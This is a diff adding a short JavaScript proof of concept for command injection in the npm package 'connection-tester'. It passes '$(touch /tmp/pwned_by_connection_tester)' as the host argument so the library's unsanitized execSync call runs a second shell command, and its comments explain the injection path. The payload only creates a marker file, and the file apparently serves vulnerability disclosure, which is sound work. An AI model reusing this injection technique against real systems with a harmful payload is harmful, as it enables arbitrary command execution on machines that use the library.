@@ -1,0 +1,14 @@
+```javascript
+const connectionTester = require("connection-tester");
+
+// The `host` argument is concatenated unsanitized into a shell command
+// string that is passed to child_process.execSync inside testSync(),
+// whose output is captured in the `shellOut` variable. Since it uses
+// no timeout/callback args, testSync() (the sync/shellOut path) is invoked.
+const maliciousHost = "$(touch /tmp/pwned_by_connection_tester)";
+
+const result = connectionTester.test(maliciousHost, 80);
+
+console.log("Result:", result);
+console.log("Check /tmp/pwned_by_connection_tester to confirm command injection.");
+```
